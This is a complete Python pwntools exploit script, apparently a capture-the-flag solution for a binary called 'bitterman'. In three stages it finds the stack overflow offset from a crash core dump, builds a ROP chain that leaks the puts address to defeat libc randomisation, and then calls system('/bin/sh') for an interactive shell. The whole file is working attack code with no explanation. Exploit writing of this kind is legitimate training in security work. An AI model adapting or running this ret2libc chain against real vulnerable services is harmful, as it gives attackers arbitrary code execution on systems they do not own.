#!/usr/bin/python2
#Author: Wh04m1 (@filip_dragovic)

from pwn import *

if args['DEBUG']:
	context.log_level='DEBUG'
context.log_level='INFO'
context(os='linux', arch='amd64')


#----- Stage1: Crash binary to find offset ----------
info("Sending payload to crash binary ....\n\r")
elf = ELF("./bitterman")
p = process(elf.path)
crash = cyclic(1024)
p.recvuntil('name?')
p.sendline("Wh04m1")
p.recvuntil('message:')
p.sendline('1024')
p.recvuntil('text:')
p.sendline(crash)
p.wait()
core = p.corefile
rsp = core.rsp
offset = core.read(rsp, 4)
offset =  cyclic_find(offset)
success("Offset found @ {a} bytes\n\r".format(a=offset))

#---- Stage2: Create rop chain to leak puts address  ------

rop = ROP(elf)
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
rop.call(elf.sym.puts, [elf.got.puts])
rop.call(elf.sym.main)
log.info(rop.dump())
p = process(elf.path)
p.recvuntil('name?')
p.sendline("Wh04m1")
p.recvuntil('message:')
p.sendline('1024')
p.recvuntil('text:')
p.sendline(fit({offset:rop.chain()}))
p.recvuntil("Thanks!")
leaked_puts = p.recv()[:8].strip().ljust(8, '\x00')
libc.address = u64(leaked_puts) - libc.sym.puts
log.success("puts will be @{a}".format(a=hex(u64(leaked_puts))))
log.success("libc address will be @{a}\n\r".format(a=hex(libc.address)))

#---- Stage3: Get shell ------

rop2 = ROP(libc)
rop2.system(next(libc.search("/bin/sh\x00")))
log.info(rop2.dump())
p.sendline("Wh04m1")
p.recvuntil('message:')
p.sendline('1024')
p.recvuntil('text:')
p.sendline(fit({offset:rop2.chain()}))
p.recvlines(2)
p.interactive()
